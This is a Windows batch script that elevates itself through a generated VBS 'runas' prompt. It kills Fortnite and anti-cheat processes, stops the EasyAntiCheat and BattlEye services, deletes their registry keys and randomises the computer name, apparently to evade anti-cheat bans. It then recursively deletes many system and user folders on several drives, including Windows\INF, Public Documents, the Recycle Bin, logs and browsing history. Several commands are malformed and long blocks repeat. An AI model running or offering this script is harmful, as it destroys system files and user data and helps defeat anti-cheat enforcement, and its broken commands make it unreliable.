
@echo off
:: BatchGotAdmin
:-------------------------------------

REM --> Check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
echo Requesting Admin...
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params= %*
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"

taskkill /f /im epicgameslauncher.exe >nul
taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul
taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul
taskkill /f /im FortniteLauncher.exe >nul
taskkill /f /im OneDrive.exe >nul
taskkill /f /im FortniteClient-Win64-Shipping.exe >nul
taskkill /f /im EpicGamesLauncher.exe >nul
taskkill /f /im UnrealCEFSubProcess.exe >nul
taskkill /f /im CEFProcess.exe >nul
taskkill /f /im EasyAntiCheat.exe >nul
taskkill /f /im BEService.exe >nul
taskkill /f /im BEServices.exe >nul
taskkill /f /im BattleEye.exe >nul
taskkill /f /im PerfWatson2.exe >nul
taskkill /f /im vgtray.exe >nul

Sc stop EasyAntiCheat
Sc stop FortniteClient-Win64-Shipping_EAC
Sc stop BattleEye
Sc stop FortniteClient-Win64-Shipping_BE

del /s /f /q %SYSTEMDRIVE%\windows\temp\*.*
rd /s /q %SYSTEMDRIVE%\windows\temp
md c:\windows\temp
del /s /f /q %SYSTEMDRIVE%\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
rd /s /q %temp%
md %temp%
del /q /f /s %SYSTEMDRIVE%\Temp\*.*
del /q /f /s %WINDIR%\Prefetch\*.*
reg delete "HKEY_CURRENT_USER\Software\Epic Games\Unreal Engine\Hardware Survey" /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games\Unreal Engine\Identifiers" /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games\Unreal Engine\Identifiers" /va /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games\Unreal Engine\Hardware Survey" /va /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games" /f 1>nul 2>nul
reg delete "HKU\S-1-5-21-860440266-1445122309-108474356-1001\Software\Epic Games" /f 1>nul 2>nul
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f 1>nul 2>nul
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f 1>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Epic Games" /f 1>nul 2>nul
@echo off    
del /s /f /q %windir%\temp\*.*    
rd /s /q %windir%\temp    
md %windir%\temp    
del /s /f /q %windir%\Prefetch\*.*    
rd /s /q %windir%\Prefetch    
md %windir%\Prefetch    
del /s /f /q %windir%\system32\dllcache\*.*    
rd /s /q %windir%\system32\dllcache    
md %windir%\system32\dllcache    
del /s /f /q "%SysteDrive%\Temp"\*.*    
rd /s /q "%SysteDrive%\Temp"    
md "%SysteDrive%\Temp"    
del /s /f /q %temp%\*.*    
rd /s /q %temp%    
md %temp%    
del /s /f /q "%USERPROFILE%\Local Settings\History"\*.*    
rd /s /q "%USERPROFILE%\Local Settings\History"    
md "%USERPROFILE%\Local Settings\History"    
del /s /f /q "%USERPROFILE%\Local Settings\Temporary Internet Files"\*.*    
rd /s /q "%USERPROFILE%\Local Settings\Temporary Internet Files"    
md "%USERPROFILE%\Local Settings\Temporary Internet Files"    
del /s /f /q "%USERPROFILE%\Local Settings\Temp"\*.*    
rd /s /q "%USERPROFILE%\Local Settings\Temp"    
md "%USERPROFILE%\Local Settings\Temp"    
del /s /f /q "%USERPROFILE%\Recent"\*.*    
rd /s /q "%USERPROFILE%\Recent"    
md "%USERPROFILE%\Recent"    
del /s /f /q "%USERPROFILE%\Cookies"\*.*    
rd /s /q "%USERPROFILE%\Cookies"    
md "%USERPROFILE%\Cookies"
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Direct3D" /v WHQLClass /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-2532382528-581214834-2534474248-1001\Device\HarddiskVolume3\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping_EAC.exe:  B1 8A B0 E9 8D 13 D5 01 00 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00" /f"
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-2532382528-581214834-2534474248-1001\Device\HarddiskVolume3\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\EasyAntiCheat\EasyAntiCheat_Setup.exe:  73 D5 4B 11 8D 13 D5 01 00 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00" /f"
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-2532382528-581214834-2534474248-1001\Device\HarddiskVolume3\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe:  E7 CB 84 E9 8D 13 D5 01 00 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00" /f"
reg delete "HKU\.Dreg delete "HKEY_CURRENT_USER\Software\Epic Games" /f
reg delete "HKEY_CURRENT_USER\Software\Epic Games\Unreal Engine" /f
reg delete "HKEY_CURRENT_USER\Software\WOW6432Node\Epic Games" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\com.epicgames.launcher" /f
regdelete HKLM/SOFTWARE/WOW6432Node/EasyAntiCheat /f
regdelete HKLM/SYSTEM/ControlSet001/Services/EasyAntiCheat /f
regdelete HKLM/SYSTEM/ControlSet001/Services/BEService /f
rmdir /s /q C:/Users/%username%/AppData/Roaming/Microsoft/Windows/CloudStore
rmdir /s /q C:/Users/%username%/AppData/Local/FortniteGame/Saved
del /f /s /q C:/Windows/System32/eac_usermode_18708921228605.dll
del /f /s /q C:/Windows/System32/eac_usermode_28043207757885.dll
del /f /s /q C:/Windows/System32/eac_usermode_33289406694579.dll
del /f /s /q C:/Windows/System32/eac_usermode_50676397309407.dll
rmdir /s /q C:/Windows/INF
rmdir /s /q C:/ProgramData/%username%/Microsoft/XboxLive/NSALCache
rmdir /s /q C:/Users/Public/Documents
rmdir /s /q C:/Windows/Prefetch
rmdir /s /q C:/Users/%username%/AppData/Local/D3DSCache
rmdir /s /q C:/Users/%username%/AppData/Local/CrashReportClient
rmdir /s /q C:/Windows/temp
rmdir /s /q C:/Users/%username%/AppData/Local/Microsoft/Windows/SettingSync/metastore
rmdir /s /q C:/Windows/SoftwareDistribution/DataStore/Logs
rmdir /s /q C:/ProgramData/Microsoft/Windows/WER/Temp
rmdir /s /q C:/Users/%username%/AppData/Local/AMD/DxCache
rmdir /s /q \"C:/Users/%username%/AppData/Local/NVIDIA Corporation
@del /s /f /a:h / a : a / q C:/Users/username%/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/*.*
@del /s /f /a:h / a : a / q C:/Users/%username%/AppData/Local/Microsoft/Windows/WebCache/*.*
rmdir /s /q C:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/AC
rmdir /s /q C:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/LocalCache
rmdir /s /q C:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/Settings
rmdir /s /q \"C:/Program Files/Epic Games/Fortnite/Engine/Plugins
rmdir /s /q \"C:/Program Files/Epic Games/Fortnite/FortniteGame/Plugins
rmdir /s /q \"C:/Program Files/Epic Games/Fortnite/FortniteGame/PersistentDownloadDir
rmdir /s /q \"C:/Program Files/Epic Games/Fortnite/FortniteGame/Config
rmdir /s /q C:/Users/%username%/AppData/Roaming/EasyAntiCheat
del /f /s /q C:/ProgramData/Microsoft/DataMart/PaidWiFi/NetworksCache
del /f /s /q C:/ProgramData/Microsoft/DataMart/PaidWiFi/Rules
rmdir /s /q C:/Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows/DeliveryOptimization/Cache
rmdir /s /q C:/Users/%username%/AppData/Local/Temp
rmdir /s /q C:/Users/%username%/AppData/Local/Microsoft/Windows/INetCache
rmdir /s /q C:/Users/%username%/AppData/Local/Microsoft/Windows/INetCookies
rmdir /s /q C:/Users/%username%/AppData/Local/Microsoft/Windows/History
rmdir /s /q C:/Users/%username%/Intel
rmdir /s /q C:/Windows/System32/config/systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData
rmdir /s /q \"C:/Users/%username%/AppData/Local/Microsoft/Feeds Cache
rmdir /s /q D:/Users/%username%/AppData/Roaming/Microsoft/Windows/CloudStore
rmdir /s /q D:/Users/%username%/AppData/Local/FortniteGame/Saved
rmdir /s /q D:/Windows/INF
rmdir /s /q D:/ProgramData/%username%/Microsoft/XboxLive/NSALCache
rmdir /s /q D:/Users/Public/Documents
rmdir /s /q D:/Windows/Prefetch
rmdir /s /q D:/Users/%username%/AppData/Local/D3DSCache
rmdir /s /q D:/Users/%username%/AppData/Local/CrashReportClient
rmdir /s /q D:/Windows/temp
rmdir /s /q D:/Users/%username%/AppData/Local/Microsoft/Windows/SettingSync/metastore
rmdir /s /q D:/Windows/SoftwareDistribution/DataStore/Logs
rmdir /s /q D:/ProgramData/Microsoft/Windows/WER/Temp
rmdir /s /q D:/Users/%username%/AppData/Local/AMD/DxCache
rmdir /s /q \"D:/Users/%username%/AppData/Local/NVIDIA Corporation
@del /s /f /a:h / a : a / q D:/Users/username%/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/*.*
@del /s /f /a:h / a : a / q D:/Users/%username%/AppData/Local/Microsoft/Windows/WebCache/*.*
rmdir /s /q D:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/AC
rmdir /s /q D:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/LocalCache
rmdir /s /q D:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/Settings
rmdir /s /q \"D:/Program Files/Epic Games/Fortnite/Engine/Plugins
rmdir /s /q \"D:/Program Files/Epic Games/Fortnite/FortniteGame/Plugins
rmdir /s /q \"D:/Program Files/Epic Games/Fortnite/FortniteGame/PersistentDownloadDir
rmdir /s /q \"D:/Program Files/Epic Games/Fortnite/FortniteGame/Config
rmdir /s /q D:/Users/%username%/AppData/Roaming/EasyAntiCheat
del /f /s /q D:/ProgramData/Microsoft/DataMart/PaidWiFi/NetworksCache
del /f /s /q D:/ProgramData/Microsoft/DataMart/PaidWiFi/Rules
rmdir /s /q D:/Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows/DeliveryOptimization/Cache
rmdir /s /q D:/Users/%username%/AppData/Local/Temp
rmdir /s /q D:/Users/%username%/AppData/Local/Microsoft/Windows/INetCache
rmdir /s /q D:/Users/%username%/AppData/Local/Microsoft/Windows/INetCookies
rmdir /s /q D:/Users/%username%/AppData/Local/Microsoft/Windows/History
rmdir /s /q D:/Users/%username%/Intel
rmdir /s /q D:/Windows/System32/config/systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData
rmdir /s /q \"D:/Users/%username%/AppData/Local/Microsoft/Feeds Cache
rmdir /s /q E:/Users/%username%/AppData/Roaming/Microsoft/Windows/CloudStore
rmdir /s /q E:/Users/%username%/AppData/Local/FortniteGame/Saved
rmdir /s /q E:/Windows/INF
rmdir /s /q E:/ProgramData/%username%/Microsoft/XboxLive/NSALCache
rmdir /s /q E:/Users/Public/Documents
rmdir /s /q E:/Windows/Prefetch
rmdir /s /q E:/Users/%username%/AppData/Local/D3DSCache
rmdir /s /q E:/Users/%username%/AppData/Local/CrashReportClient
rmdir /s /q E:/Users/%username%/AppData/Local/Microsoft/Windows/SettingSync/metastore
rmdir /s /q E:/Windows/SoftwareDistribution/DataStore/Logs
rmdir /s /q E:/ProgramData/Microsoft/Windows/WER/Temp
rmdir /s /q E:/Users/%username%/AppData/Local/AMD/DxCache
rmdir /s /q \"E:/Users/%username%/AppData/Local/NVIDIA Corporation
@del /s /f /a:h / a : a / q E:/Users/username%/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/*.*
@del /s /f /a:h / a : a / q E:/Users/%username%/AppData/Local/Microsoft/Windows/WebCache/*.*
rmdir /s /q E:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/AC
rmdir /s /q E:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/LocalCache
rmdir /s /q E:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/Settings
rmdir /s /q \"E:/Program Files/Epic Games/Fortnite/Engine/Plugins
rmdir /s /q \"E:/Program Files/Epic Games/Fortnite/FortniteGame/Plugins
rmdir /s /q \"E:/Program Files/Epic Games/Fortnite/FortniteGame/PersistentDownloadDir
rmdir /s /q \"E:/Program Files/Epic Games/Fortnite/FortniteGame/Config
rmdir /s /q E:/Users/%username%/AppData/Roaming/EasyAntiCheat
del /f /s /q E:/ProgramData/Microsoft/DataMart/PaidWiFi/NetworksCache
del /f /s /q E:/ProgramData/Microsoft/DataMart/PaidWiFi/Rules
rmdir /s /q E:/Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows/DeliveryOptimization/Cache
rmdir /s /q E:/Users/%username%/AppData/Local/Temp
rmdir /s /q E:/Users/%username%/AppData/Local/Microsoft/Windows/INetCache
rmdir /s /q E:/Users/%username%/AppData/Local/Microsoft/Windows/INetCookies
rmdir /s /q E:/Users/%username%/AppData/Local/Microsoft/Windows/History
rmdir /s /q E:/Users/%username%/Intel
rmdir /s /q E:/Windows/System32/config/systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData
rmdir /s /q \"E:/Users/%username%/AppData/Local/Microsoft/Feeds Cache
rmdir /s /q F:/Users/%username%/AppData/Roaming/Microsoft/Windows/CloudStore
rmdir /s /q F:/Users/%username%/AppData/Local/FortniteGame/Saved
rmdir /s /q F:/Windows/INF
rmdir /s /q F:/ProgramData/%username%/Microsoft/XboxLive/NSALCache
rmdir /s /q F:/Users/Public/Documents
rmdir /s /q F:/Windows/Prefetch
rmdir /s /q F:/Users/%username%/AppData/Local/D3DSCache
rmdir /s /q F:/Users/%username%/AppData/Local/CrashReportClient
rmdir /s /q F:/Windows/temp
rmdir /s /q F:/Users/%username%/AppData/Local/Microsoft/Windows/SettingSync/metastore
rmdir /s /q F:/Windows/SoftwareDistribution/DataStore/Logs
rmdir /s /q F:/ProgramData/Microsoft/Windows/WER/Temp
rmdir /s /q F:/Users/%username%/AppData/Local/AMD/DxCache
rmdir /s /q \"F:/Users/%username%/AppData/Local/NVIDIA Corporation
@del /s /f /a:h / a : a / q F:/Users/username%/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/*.*
@del /s /f /a:h / a : a / q F:/Users/%username%/AppData/Local/Microsoft/Windows/WebCache/*.*
rmdir /s /q F:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/AC
rmdir /s /q F:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/LocalCache
rmdir /s /q F:/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/Settings
rmdir /s /q \"F:/Program Files/Epic Games/Fortnite/Engine/Plugins
rmdir /s /q \"F:/Program Files/Epic Games/Fortnite/FortniteGame/Plugins
rmdir /s /q \"F:/Program Files/Epic Games/Fortnite/FortniteGame/PersistentDownloadDir
rmdir /s /q \"F:/Program Files/Epic Games/Fortnite/FortniteGame/Config
rmdir /s /q F:/Users/%username%/AppData/Roaming/EasyAntiCheat
del /f /s /q F:/ProgramData/Microsoft/DataMart/PaidWiFi/NetworksCache
del /f /s /q F:/ProgramData/Microsoft/DataMart/PaidWiFi/Rules
rmdir /s /q F:/Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows/DeliveryOptimization/Cache
rmdir /s /q F:/Users/%username%/AppData/Local/Temp
rmdir /s /q F:/Users/%username%/AppData/Local/Microsoft/Windows/INetCache
rmdir /s /q F:/Users/%username%/AppData/Local/Microsoft/Windows/INetCookies
rmdir /s /q F:/Users/%username%/AppData/Local/Microsoft/Windows/History
rmdir /s /q F:/Users/%username%/Intel
rmdir /s /q F:/Windows/System32/config/systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData
rmdir /s /q \"F:/Users/%username%/AppData/Local/Microsoft/Feeds Cache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Temp
rmdir /s /q %systemdrive%/Users/%username%/AppData/Roaming/EasyAntiCheat
taskkill /f /im EpicGamesLauncher.exe
taskkill /f /im FortniteClient-Win64-Shipping.exe
taskkill /f /im OneDrive.exe
rd /q /s %systemdrive%/$Recycle.Bin
rd /q /s d:/$Recycle.Bin
rd /q /s e:/$Recycle.Bin
rd /q /s f:/$Recycle.Bin
rmdir /s /q %systemdrive%/Windows/servicing/InboxFodMetadataCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Roaming/Microsoft/Windows/CloudStore
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/FortniteGame/Saved
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/Explorer/IconCacheToDelete
rmdir /s /q %systemdrive%/Windows/INF
rmdir /s /q %systemdrive%/ProgramData/%username%/Microsoft/XboxLive/NSALCache
rmdir /s /q %systemdrive%/Windows/Prefetch
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/D3DSCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/CrashReportClient
rmdir /s /q %systemdrive%/Windows/temp
rmdir /s /q %systemdrive%/Windows/Logs
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/SettingSync/metastore
rmdir /s /q %systemdrive%/Windows/SoftwareDistribution/DataStore/Logs
rmdir /s /q %systemdrive%/ProgramData/Microsoft/Windows/WER/Temp
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/AMD/DxCache
rmdir /s /q %systemdrive%/ProgramData/USOShared/Logs
@del /s /f /a:h / a : a / q %systemdrive%/Users/username%/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/*.*
@del /s /f /a:h / a : a / q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/WebCache/*.*
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/AC
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/LocalCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Packages/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/Settings
rmdir /s /q \"%systemdrive%/Program Files/Epic Games/Fortnite/Engine/Plugins
rmdir /s /q \"%systemdrive%/Program Files/Epic Games/Fortnite/FortniteGame/Plugins
rmdir /s /q \"%systemdrive%/Program Files/Epic Games/Fortnite/FortniteGame/PersistentDownloadDir
rmdir /s /q \"%systemdrive%/Users/%username%/AppData/Local/NVIDIA Corporation
del /f /s /q %systemdrive%/ProgramData/Microsoft/DataMart/PaidWiFi/NetworksCache
del /f /s /q %systemdrive%/ProgramData/Microsoft/DataMart/PaidWiFi/Rules
rmdir /s /q %systemdrive%/Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows/DeliveryOptimization/Cache
rmdir / s / q %systemdrive%/Users/%username%/AppData/Local/Temp
rmdir /s /q %systemdrive%/ProgramData/%username%/Microsoft/XboxLive
rmdir /s /q %systemdrive%/Users/Public/Documents
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/NVIDIA Corporation
@del /s /f /a:h / a : a / q %systemdrive%/Users/%username%/AppData/Local/Microsoft/XboxLive/*.*
rmdir /s /q \"%systemdrive%/Program Files/Epic Games/Fortnite/FortniteGame/Config
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/INetCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/INetCookies
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/IEDownloadHistory
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/IECompatUaCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/IECompatCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/INetCookies/DNTException
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/INetCookies/PrivacIE
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/History
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/History/Low
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Packages/Microsoft.OneConnect_8wekyb3d8bbwe/LocalState
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Packages/Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe/LocalCache/EcsCache0
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Packages/Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy/LocalState/TargetedContentCache/v3
rmdir /s /q %systemdrive%/Users/%username%/Intel
rmdir /s /q %systemdrive%/Windows/System32/config/systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData
rmdir /s /q \"%systemdrive%/Users/%username%/AppData/Local/Microsoft/Feeds Cache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Feeds Cache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/EpicGamesLauncher
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/UnrealEngine
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/UnrealEngineLauncher
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/AMD
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/INTEL
rmdir /s /q %systemdrive%/Users/%username%/ntuser.ini
rmdir /s /q %systemdrive%/Users/%username%/AppData/LocalLow/Microsoft/CryptnetUrlCache
rmdir /s /q \"%systemdrive%/System Volume Information/IndexerVolumeGuid
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/CLR_v4.0
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/CLR_v3.0
rmdir /s /q \"%systemdrive%/Users/%username%/AppData/Local/Microsoft/Internet Explorer/Recovery
@del /s /f /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Feeds
@del /s /f /q %systemdrive%/Windows/System32/restore/MachineGuid.txt
@del /s /f /q %systemdrive%/ProgramData/Microsoft/Windows/WER
@del /s /f /q %systemdrive%/Users/Public/Libraries
@del /s /f /q %systemdrive%/MSOCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/WebCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/PowerShell/StartupProfileData-NonInteractive
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/ConnectedDevicesPlatform/L.%username%/ActivitiesCache.db-wal
rmdir /s /q %systemdrive%/ProgramData/USOShared/Logs/User
@del /s /f /q %systemdrive%/Users/%username%/AppData/Local/D3DSCache
rmdir /s /q %systemdrive%/Windows/ServiceProfiles/LocalService/AppData/Local/ConnectedDevicesPlatform/CDPGlobalSettings.cdp
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/cache/qtshadercache
@del /s /f /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/UsrClass.dat.log2
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/AMD/VkCache
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/AMD/CN/NewsFeed
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/Windows/INetCache/IE/RHKRUA8J
rmdir /s /q %systemdrive%/Users/%username%/AppData/Local/Microsoft/CLR_v4.0/UsageLogs
rmdir /s /q %systemdrive%/Windows/Temp
rmdir /s /q %systemdrive%/Windows/SERVIC~1/NETWOR~1/AppData/Local/Temp
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Epic Games" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\EpicGames" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\EpicGames" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\Description: "Provides integrated security and services for online multiplayer games."" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\Security\Security:  01 00 14 80 A0 00 00 00 AC 00 00 00 14 00 00 00 30 00 00 00 02 00 1C 00 01 00 00 00 02 80 14 00 FF 01 0F 00 01 01 00 00 00 00 00 01 00 00 00 00 02 00 70 00 05 00 00 00 00 00 14 00 30 00 02 00 01 01 00 00 00 00 00 01 00 00 00 00 00 00 14 00 FD 01 02 00 01 01 00 00 00 00 00 05 12 00 00 00 00 00 18 00 FF 01 0F 00 01 02 00 00 00 00 00 05 20 00 00 00 20 02 00 00 00 00 14 00 8D 01 02 00 01 01 00 00 00 00 00 05 04 00 00 00 00 00 14 00 8D 01 02 00 01 01 00 00 00 00 00 05 06 00 00 00 01 01 00 00 00 00 00 05 12 00 00 00 01 01 00 00 00 00 00 05 12 00 00 00" /f
reg delete "HKLM\SOFTWARE\WOW6432Node\EasyAntiCheat\GamesInstalled: "217;"" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\Type: 0x00000010" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\Start: 0x00000003" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\ErrorControl: 0x00000001" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\ImagePath: ""%systemdrive%\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe""" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\DisplayName: "EasyAntiCheat"" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\WOW64: 0x0000014C" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat" /f"
reg delete "HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat\Security" /f"
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EasyAntiCheat" /f"
regdelete HKLM\SOFTWARE\WOW6432Node\EasyAntiCheat /f
regdelete HKLM\SYSTEM\ControlSet001\Services\EasyAntiCheat /f
regdelete HKLM\SYSTEM\ControlSet001\Services\BEService /f
rmdir /s /q C:\Users\%username%\AppData\Roaming\Microsoft\Windows\CloudStore
rmdir /s /q C:\Users\%username%\AppData\Local\FortniteGame\Saved
rmdir /s /q C:\Windows\INF
rmdir /s /q C:\ProgramData\%username%\Microsoft\XboxLive\NSALCache
rmdir /s /q C:\Users\Public\Documents
rmdir /s /q C:\Windows\Prefetch
rmdir /s /q C:\Users\%username%\AppData\Local\D3DSCache
rmdir /s /q C:\Users\%username%\AppData\Local\CrashReportClient
rmdir /s /q C:\Windows\temp
rmdir /s /q C:\Users\%username%\AppData\Local\Microsoft\Windows\SettingSync\metastore
rmdir /s /q C:\Windows\SoftwareDistribution\DataStore\Logs
rmdir /s /q C:\ProgramData\Microsoft\Windows\WER\Temp
rmdir /s /q C:\Users\%username%\AppData\Local\AMD\DxCache
rmdir /s /q \"C:\Users\%username%\AppData\Local\NVIDIA Corporation
@del /s /f /a:h / a : a / q C:\Users\username%\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\*.*
@del /s /f /a:h / a : a / q C:\Users\%username%\AppData\Local\Microsoft\Windows\WebCache\*.*
rmdir /s /q C:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC
rmdir /s /q C:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\LocalCache
rmdir /s /q C:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings
rmdir /s /q \"C:\Program Files\Epic Games\Fortnite\Engine\Plugins
rmdir /s /q \"C:\Program Files\Epic Games\Fortnite\FortniteGame\Plugins
rmdir /s /q \"C:\Program Files\Epic Games\Fortnite\FortniteGame\PersistentDownloadDir
rmdir /s /q \"C:\Program Files\Epic Games\Fortnite\FortniteGame\Config
rmdir /s /q C:\Users\%username%\AppData\Roaming\EasyAntiCheat
